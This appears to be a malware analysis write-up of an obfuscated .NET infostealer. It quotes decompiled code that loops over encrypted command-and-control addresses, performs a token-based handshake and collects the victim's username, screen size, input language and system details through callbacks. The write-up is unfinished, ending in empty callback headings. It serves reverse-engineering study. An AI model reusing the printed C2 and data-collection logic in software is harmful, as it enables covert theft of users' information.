Analysis of malware 1 – SHA256: 2a9cd95dea7e44cba7056a7a0f38c002399e9af16d0773462f2dd9bb487da8af

# Assumptions / Notes found with DIE (Detect It Easy)
1.1 DiE detects obfuscation in the executable, though the obfuscator is unknown. [confirmed in Static Analysis]

1.2 DiE does not detect any packing. [confirmed in Static Analysis]

1.3 Environment: .NET, C# → managed executable → CLR (Common Language Runtime) [confirmed in Static Analysis]

# Static and dynamic analysis with ILSpy
- EntryPoint: Program.Main.
- We can immediately confirm that the code is indeed written with C# using .NET → Assumption 1.3 confirmed
- Assumption 1.2 also confirmed since if the .exe was packed we wouldn’t see clear code
- Assumption 1.1 is also confirmed: function/variables/class/… names are obfuscated (simple obfuscation)

After manually checking the 3 lines inside the entry point, we see that what’s relevant is inside Application.Run(new Form1()). Form1() leads to Program2.WriteLine(); which leads to the heart of the malware. 

#### Code 1
```csharp
public static void WriteLine()
{
  try
  {
      if (!string.IsNullOrWhiteSpace(Arguments.Message))
      {
          Task.Factory.StartNew(() => MessageBox.Show(StringDecrypt.Read(Arguments.Message, Arguments.Key), "", MessageBoxButton.OK, MessageBoxImage.Hand));
      }
      ConnectionProvider connectionProvider = new ConnectionProvider();
      bool flag = false;
      while (!flag)
      {
          string[] array = StringDecrypt.Read(Arguments.IP, Arguments.Key).Split('|');
          foreach (string address in array)
          {
              if (connectionProvider.Id1(address))
              {
                  flag = true;
                  break;
              }
          }
          Thread.Sleep(5000);
```

#### Code 2
```csharp
[Obfuscation(ApplyToMembers = true, Exclude = true, StripAfterObfuscation = true)]
public static class Arguments
{
  public static string IP;
  public static string ID;
  public static string Message;
  public static string Key;
  public static int Version;

  static Arguments()
  {
      IP = "LiwbUTQSMko0CT1JLhFMUzYSDAA3Nz0A";
      ID = "AhU+EiEvExA=";
      Message = "";
      Key = "cxx";
      Version = 1;
```

Already in the beginning of the malware we can find the server’s IP to which it connects to. It seems to be encrypted and we can find the decrypted it at runtime, since we can see that the program itself decrypts it for us and keeps it stored in an array of addresses: 
`string[] array = StringDecrypt.Read(Arguments.IP, Arguments.Key).Split('|');`

The malware tries to connect to the server: 
`ConnectionProvider connectionProvider = new ConnectionProvider();` and then in
```csharp
foreach (string address in array)  {	
   if (connectionProvider.Id1(address))
```

Where `Id1` is just:
#### Code 3
```csharp
public bool Id1(string address)
{
    return RequestConnection(address) && Id3();
}
```

#### Code 4 - RequestConnection, sends an initial message to the server 
<img width="603" height="388" alt="image" src="https://github.com/user-attachments/assets/c25895b8-d4d7-4601-8897-2b4799f52778" />

#### Code 5
```csharp
public bool Id3()
{
    try
    {
        return connector.Id1();
    }
[OperationContract(Name = "Id1")]
bool Id1();
```

In **Code 4**, we can see that the malware builds up a the header for the message that will be sent later.

Protocol used: TCP (server IP found with DnSpy):
Authorization ns1, with hardcoded token (probably checked by the server)

Then, the Id1 function (**Code 5**) supposedly just sends an empty message with the above header → probably a handshake with the C2 server.

We now get back to **Code 1** and proceed with the analysis:
#### Code 6
```csharp
Entity2 args = new Entity2();
while (!connectionProvider.Id5(out args))
{
   if (!connectionProvider.Id3())
   {  
      throw new Exception();
   }
   Thread.Sleep(1000);
```
The malware now expects the server to send a message through function Id5:

#### Code 7
```csharp
public bool Id5(out Entity2 args)
{
    try
    {
        args = new Entity2();
        args = connector.Id2();

[OperationContract(Name = "Id2")]
Entity2 Id2();
```

And the malware responds again with the handshake through Id1 **Code 5**.
Entity2 is just some settings provided by the server. The class data members are shown in the end.

If we analyze **Code 1** further, we find the hearth of the malware.
#### Code 8
```csharp
EntityResolver entityResolver = ItemBase.Extract<EntityResolver>();
while (!entityResolver.Invoker(connectionProvider, args, ref result))
{
   Thread.Sleep(5000);
}
```
Here, the Extract method is just:
```csharp
public static T Extract<T>() where T : EntityResolver
{
    return (Arguments.Version == 1) ? (Activator.CreateInstance<PartsSender>() as T) : (Activator.CreateInstance<FullInfoSender>() as T);
}
```

Of course both classes “PartsSender” and “FullInfoSender” will contain an “Invoker” method. We only need to check PartsSender since we know that Arguments.Version = 1 (see Code 2 above)

# Static analysis of PartsSender class 
#### Code 9 - PartsSender constructor
```csharp
{
    EntityResolver.Main = new Enter[15]
    {
        asdk9345asd, asdk8jasd, ылв92р34выа, аловй, ыал8р45, ываш9р34, ывал8н34, вал93тфыв, вашу0л34, навева,
        ащы9р34, ыва83о4тфыв, askd435, asdasod9234oasd, длвап9345
    };
    EntityResolver.First = new Enter[6] { sdf934asd, asd44123, sdfi35sdf, sdfo8n234, asdkadu8, fdfg9i3jn4 };
    Random rnd = new Random();
    EntityResolver.Main = EntityResolver.Main.OrderBy((Enter x) => rnd.Next()).ToArray();
    EntityResolver.First = EntityResolver.First.OrderBy((Enter x) => rnd.Next()).ToArray();
}
```
The constructor just stores callbacks in EntityResolver. These callbacks will contain the actual behavior of the malware.
After the Constructor, we can see in Code 8 that the Invoker method is called:

#### Code 10 - PartSender's "Invoke" method
```csharp
public override bool Invoker(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
{
   return sdf9j3nasd(connection, settings, ref result);
}
```
The method inside Invoker:
- Stores the user’s IPv4 address in Entity7. Entity7 is basically just UserInfo, see in the end.
- Checks whether a SystemCache folder exists in User Local Data. If it exists, it saves a flag that indicates the existence inside Entity7.
- Finally each callback that was registered in the constructor (Code 9) is called.

# PartsSender callbacks – malware heart
I analyze the callbacks in the same order defined in Code 9: first the callbacks stored in EntityResolver.First, and then the callbacks in EntityResolver.Main.

#### Callback 1
```csharp
public static void sdf934asd(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
{
    result.Id3 = Environment.UserName;
}
```
This just retrieves the username and stores it inside Entity7.Id3. So we already know what Id3 in Entity7 is. Since Entity7 is just User, then:
Entity7.Id3 = User.Username.

#### Callback 2
```csharp
public static System.Drawing.Size GetVirtualDisplaySize()
{
  try
  {
      return new System.Drawing.Size((int)SystemParameters.VirtualScreenWidth, (int)SystemParameters.VirtualScreenHeight);
  }
  catch
  {
      return Screen.PrimaryScreen.Bounds.Size;
  }
}
```
The second callback just calls another method to retrieve the virtual display size, i.e. if there’s multiple monitors it’ll get the total display size, and then stores it: `result.Id6 = GdiHelper.GetVirtualDisplaySize().ToString(); `
Thus, Entity7.Id6 = User.VirtualDisplaySize

#### Callback 3
```csharp
public static void sdfi35sdf(ConnectionProvider connection, Entity2 settings, ref Entity7 result)
{
  result.Id5 = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
  result.Id4 = SystemInfoHelper.QueryWin();
}
```
→ Stores the device’s input language, the system’s architecture and some specific system information:


#### HKLM_GetString simply takes a value from the system’s registry:

#### Callback 5
#### Callback 6
#### Callback 7
#### Callback 8
#### Callback 9
#### Callback 10




